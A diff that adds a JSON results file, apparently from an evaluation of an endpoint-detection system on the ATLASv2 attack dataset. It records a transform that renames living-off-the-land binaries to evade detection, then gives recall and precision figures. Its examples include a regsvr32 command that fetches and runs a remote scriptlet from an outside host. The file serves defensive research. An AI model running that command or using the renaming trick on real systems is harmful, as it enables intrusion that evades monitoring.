@@ -1,0 +1,224 @@
+{
+ "set": "ATLASV2_EDR-h1",
+ "bundle": "/data/lab08/heldout/ATLASV2_EDR/h1/v07rel",
+ "fleet": [
+  "ATLASV2_EDR-h1",
+  "ATLASV2_EDR-h2"
+ ],
+ "n_attacks": 10,
+ "gt_nodes": 48,
+ "days": 1,
+ "transform": {
+  "transform": "launder",
+  "lotl": {
+   "targets": [
+    {
+     "key": "/windows/system32/mshta.exe",
+     "kind": "shell",
+     "gt_nodes": 6,
+     "replacement_key": "/windows/system32/cmd.exe",
+     "replacement": "c:\\windows\\system32\\cmd.exe",
+     "fallback_to_process": false,
+     "baseline_runs": 20,
+     "renamed_nodes": 6
+    },
+    {
+     "key": "/windows/system32/regsvr32.exe",
+     "kind": "process",
+     "gt_nodes": 5,
+     "replacement_key": "/program files/confer/repwmiutils.exe",
+     "replacement": "c:\\program files\\confer\\repwmiutils.exe",
+     "fallback_to_process": false,
+     "baseline_runs": 24913,
+     "renamed_nodes": 5
+    },
+    {
+     "key": "/windows/system32/windowspowershell/{v}/powershell.exe",
+     "kind": "shell",
+     "gt_nodes": 8,
+     "replacement_key": "/windows/system32/cmd.exe",
+     "replacement": "c:\\windows\\system32\\cmd.exe",
+     "fallback_to_process": false,
+     "baseline_runs": 20,
+     "renamed_nodes": 8
+    }
+   ],
+   "renamed_nodes": 19,
+   "renamed_gt": 19,
+   "still_unknown": 0,
+   "baseline_programs": 92,
+   "baseline_processes": 26643,
+   "top_shell": "/windows/system32/cmd.exe",
+   "top_process": "/program files/confer/repwmiutils.exe",
+   "examples": [
+    {
+     "before": "subject c:\\windows\\system32\\regsvr32.exe None",
+     "after": "subject c:\\program files\\confer\\repwmiutils.exe None",
+     "gt": true
+    },
+    {
+     "before": "subject c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll",
+     "after": "subject c:\\program files\\confer\\repwmiutils.exe repwmiutils /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll",
+     "gt": true
+    },
+    {
+     "before": "subject c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None",
+     "after": "subject c:\\windows\\system32\\cmd.exe None",
+     "gt": true
+    }
+   ]
+  },
+  "launder": {
+   "payloads": 0,
+   "copier_label": "subject c:\\program files\\confer\\repwmiutils.exe RepWmiUtils.exe muuid",
+   "items": [],
+   "candidates_not_written": 0,
+   "edges_added": 0
+  }
+ },
+ "variants": [
+  "P2",
+  "F3",
+  "L12"
+ ],
+ "attacks_all": [
+  "atlasv2_edr_m1",
+  "atlasv2_edr_m2",
+  "atlasv2_edr_m3",
+  "atlasv2_edr_m4",
+  "atlasv2_edr_m5",
+  "atlasv2_edr_m6",
+  "atlasv2_edr_s1",
+  "atlasv2_edr_s2",
+  "atlasv2_edr_s3",
+  "atlasv2_edr_s4"
+ ],
+ "P2": {
+  "TP": 5,
+  "FP": 47,
+  "recall": 0.104,
+  "attacks": 5,
+  "FP/day": 47.0,
+  "TP/day": 5.0,
+  "by_layer": {
+   "novelty": 7,
+   "corroborated": 6,
+   "rules": 39
+  },
+  "by_layer_tp": {
+   "corroborated": 5
+  },
+  "by_rule": {
+   "novelty/novel_executable": 7,
+   "corroborated/learned_near_alert": 6,
+   "rules/untrusted_exec": 27,
+   "rules/untrusted_code_network": 6,
+   "rules/exfiltration": 6
+  },
+  "by_rule_tp": {
+   "corroborated/learned_near_alert": 5
+  },
+  "attacks_found": [
+   "atlasv2_edr_m2",
+   "atlasv2_edr_m3",
+   "atlasv2_edr_m4",
+   "atlasv2_edr_s2",
+   "atlasv2_edr_s4"
+  ],
+  "per_attack_gt_rules": {
+   "atlasv2_edr_s2": {
+    "corroborated/learned_near_alert": 1
+   },
+   "atlasv2_edr_m2": {
+    "corroborated/learned_near_alert": 1
+   },
+   "atlasv2_edr_m3": {
+    "corroborated/learned_near_alert": 1
+   },
+   "atlasv2_edr_m4": {
+    "corroborated/learned_near_alert": 1
+   },
+   "atlasv2_edr_s4": {
+    "corroborated/learned_near_alert": 1
+   }
+  },
+  "rows": 52,
+  "precision": 0.096
+ },
+ "F3": {
+  "TP": 5,
+  "FP": 47,
+  "recall": 0.104,
+  "attacks": 5,
+  "FP/day": 47.0,
+  "TP/day": 5.0,
+  "by_layer": {
+   "novelty": 7,
+   "corroborated": 6,
+   "rules": 39
+  },
+  "by_layer_tp": {
+   "corroborated": 5
+  },
+  "by_rule": {
+   "novelty/novel_executable": 7,
+   "corroborated/learned_near_alert": 6,
+   "rules/untrusted_exec": 27,
+   "rules/untrusted_code_network": 6,
+   "rules/exfiltration": 6
+  },
+  "by_rule_tp": {
+   "corroborated/learned_near_alert": 5
+  },
+  "attacks_found": [
+   "atlasv2_edr_m2",
+   "atlasv2_edr_m3",
+   "atlasv2_edr_m4",
+   "atlasv2_edr_s2",
+   "atlasv2_edr_s4"
+  ],
+  "per_attack_gt_rules": {
+   "atlasv2_edr_s2": {
+    "corroborated/learned_near_alert": 1
+   },
+   "atlasv2_edr_m2": {
+    "corroborated/learned_near_alert": 1
+   },
+   "atlasv2_edr_m3": {
+    "corroborated/learned_near_alert": 1
+   },
+   "atlasv2_edr_m4": {
+    "corroborated/learned_near_alert": 1
+   },
+   "atlasv2_edr_s4": {
+    "corroborated/learned_near_alert": 1
+   }
+  },
+  "rows": 52,
+  "precision": 0.096
+ },
+ "L12": {
+  "TP": 0,
+  "FP": 46,
+  "recall": 0.0,
+  "attacks": 0,
+  "FP/day": 46.0,
+  "TP/day": 0.0,
+  "by_layer": {
+   "novelty": 7,
+   "rules": 39
+  },
+  "by_layer_tp": {},
+  "by_rule": {
+   "novelty/novel_executable": 7,
+   "rules/untrusted_exec": 27,
+   "rules/untrusted_code_network": 6,
+   "rules/exfiltration": 6
+  },
+  "by_rule_tp": {},
+  "attacks_found": [],
+  "per_attack_gt_rules": {},
+  "rows": 46,
+  "precision": 0.0
+ }
+}
